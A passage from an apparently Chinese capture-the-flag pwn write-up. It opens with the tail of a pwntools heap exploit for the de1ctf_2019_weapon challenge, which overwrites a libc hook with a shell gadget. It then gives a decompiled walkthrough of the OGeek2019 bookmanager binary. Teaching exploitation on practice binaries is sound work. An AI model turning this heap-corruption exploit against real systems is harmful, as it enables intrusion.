addr_hook <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] addr_hook: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>addr_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#t = remote('node3.buuoj.cn', 28913)</span>            t <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./de1ctf_2019_weapon'</span><span class="token punctuation">)</span>            exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span></code></pre><h2 id="0xf-OGeek2019-bookmanager"><a href="#0xf-OGeek2019-bookmanager" class="headerlink" title="0xf.[OGeek2019]bookmanager"></a>0xf.[OGeek2019]bookmanager</h2><p>这题，👴还是太菜了，碰到这种代码量巨大的题目就昏了头，满眼的*，太顶了，👴的代码审计能力还是弱的一批。</p><p>这题我看的ex师傅的exp调试的，由于程序有八个功能，👴做题时看到第二个功能就萎了，太长🌶，👴受⑧了，直接就上网搜了一波exp，拿着ex师傅的exp调试完后就一把梭，这样还是不好，所以在这里把整个程序的功能实现完整的复现一遍</p><p>首先是main函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">sub_C1A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_D97</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"book name: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> off_2554 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">add_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">add_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">remove_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token function">remove_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>        <span class="token function">remove_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7u</span><span class="token punctuation">:</span>        <span class="token function">preview</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8u</span><span class="token punctuation">:</span>        <span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9u</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>程序一开始分配一个0x80的chunk，然后往chunk中读入bookname，接着是经典的switch语句，八个功能，我们依次来分析</p><h4 id="1-add-chapter"><a href="#1-add-chapter" class="headerlink" title="1.add_chapter()"></a>1.add_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">add_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>add_chapter</strong>功能接受的参数为main函数中分配的0x80大小chunk的指针，为方便，后面统称为book_chunk</p><p>程序通过for循环，以<strong>*(a1 + 8 * (i + 4LL))</strong>遍历book_chunk，初始为<strong>*(a1 +0x20)</strong>，如果<strong>*(a1 + 8 * (i + 4LL))</strong>为空，则分配一个0x80的chunk，指针放入该位置，然后通过这个指针往对应chunk写入数据。根据这个功能我们就能写出book_chunk的结构体了，如下</p><pre><code>struct book{    char name[32];    char *chapter[12];}</code></pre><h4 id="2-add-section"><a href="#2-add-section" class="headerlink" title="2.add_section()"></a>2.add_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-40h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-18h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich chapter do you want to add into:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%p"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>add_section()接收的参数也为book_chunk，实际上，八个功能接收的参数都为book_chunk。函数首先要求输入chaptername，然后进入for循环，一共有两个for循环，第一个for循环遍历book_chunk，然后依次对比每个chaptername和我们输入的chaptername是否一致，如果一致则进入下一层循环，<strong>v1 = *(a1 + 8 * (i + 4LL))</strong>，v1则被赋值为对应的chapterchunk指针。</p><p>进入下一层循环后，已久会用上一层循环的判断方式，<strong><em>(\</em>(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL))</strong>,我们来分析一下这一串指针的意思，第一部分<strong>*(a1 + 8 * (i + 4LL))</strong>，这其实就是v1，原式可以化简为<strong>*(v1 + 8 * (j + 4LL))</strong>，v1指向chapterchunk，所以<strong>*(v1 + 8 * (j + 4LL))</strong>的最小值为<strong>*(v1 +0x20)</strong>。如果<strong>*(v1 + 8 * (j + 4LL))</strong>没有值，那么分配一个0x30的chunk，将指针存入其中，所以我们也能写出chapter的结构体，如下</p><pre><code>struct chapter{    char name[32];    char* section[10];}</code></pre><p>然后打印出我们申请的sectionchunk的地址，往sectionchunk读入数据，并将sectionchunk+40的位置写入32。</p><h4 id="3-add-text"><a href="#3-add-text" class="headerlink" title="3.add_text()"></a>3.add_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-14Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-148h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-144h]</span>  <span class="token keyword">char</span> s2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-140h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-120h]</span>  <span class="token keyword">unsigned</span> __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+148h] [rbp-18h]</span>  v10 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich section do you want to add into:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>off_18 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>LABEL_12<span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHow many chapters you want to write:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">256</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nText:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nToo many"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v10<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个程序通过我们输入的sectionname来定位sectionchunk，和上一个功能的定位方式一样。</p><p>定位了section之后，首先输入textsize，然后分配一个textsize大小的chunk，并将指针存入sectionchunk+32的位置处，接着往t栈中的一个变量s写入数据，然后将写入s的数据复制到textchunk，同样我们也能写出section的结构体，如下</p><pre><code>struct section{    char name[32];    char* text;}</code></pre><h4 id="4-remove-text"><a 